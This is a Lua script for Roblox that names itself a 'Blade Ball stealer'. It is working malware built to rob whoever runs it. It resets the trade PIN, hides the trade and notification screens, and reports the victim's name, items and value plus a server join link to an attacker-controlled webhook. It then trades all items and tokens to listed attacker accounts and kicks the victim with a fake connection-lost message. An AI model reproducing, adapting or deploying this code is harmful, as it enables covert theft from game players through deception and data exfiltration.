-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // RECUPERATION DES GLOBALES
local auth_token = _G.AuthToken or "EBK-SS-A" 
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui

-- // PROTECTION INITIALE
if webhook == "" or #users == 0 then
    return
end

-- // FONCTION D'ENVOI (FIXED FOR CLOUDFLARE WORKER)
local function sendToWorker(payload)
    -- On force le token dans chaque envoi pour le Worker
    payload["auth_token"] = auth_token
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        local success, result = pcall(function()
            return requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        return success
    end
end

-- // BYPASS PIN
pcall(function()
    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"})
end)

-- // DISCRETION UI
local tradeGui = PlayerGui:WaitForChild("Trade")
local notificationsGui = PlayerGui:WaitForChild("Notifications")
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false
tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
notificationsGui.Notifications.Visible = false

-- // FORMATAGE RAP
local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local idx = 1
    while number >= 1000 and idx < #suffixes do
        number = number / 1000
        idx = idx + 1
    end
    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
end

-- // SCAN INVENTAIRE
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildNameToRAPMap(cat)
    local nameToRAP = {}
    local catData = rapData[cat]
    if not catData then return nameToRAP end
    for key, rap in pairs(catData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(key) end)
        if s and type(decoded) == "table" then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local totalRAP = 0
for _, cat in ipairs(categories) do
    local map = buildNameToRAPMap(cat)
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = map[info.Name] or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

-- // GESTION DES EMBEDS
local function sendEmbed(isJoin)
    local grouped = {}
    for _, item in ipairs(itemsToSend) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    local listText = ""
    for name, count in pairs(grouped) do
        listText = listText .. string.format("%s (x%d)\n", name, count)
    end

    local payload = {
        ["username"] = isJoin and (totalRAP >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
        ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or nil,
        ["embeds"] = {{
            ["title"] = isJoin and (totalRAP >= 500 and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
            ["color"] = totalRAP >= 500 and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim 👤:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total RAP 💰:", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
                {name = "Items 📝:", value = listText ~= "" and listText or "None", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(payload)
end

-- // EXECUTION TRADE
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    sendEmbed(true) -- Message de Join

    local inTrade = false
    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

    local function doTrade(targetPlayer)
        sendEmbed(false) -- Message Server Hit
        while #itemsToSend > 0 do
            repeat 
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
                task.wait(0.5) 
            until inTrade
            
            local batch = {}
            for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
            for _, item in ipairs(batch) do
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            end

            -- Tokens
            pcall(function()
                local raw = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
                local tokens = tonumber(raw) or 0
                if tokens > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end
            end)

            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.3)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.5) until not inTrade
        end
        plr:kick("Connection lost, please rejoin.")
    end

    -- Surveillance des G Users
    local function check(p)
        if table.find(users, p.Name) then doTrade(p) end
    end
    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
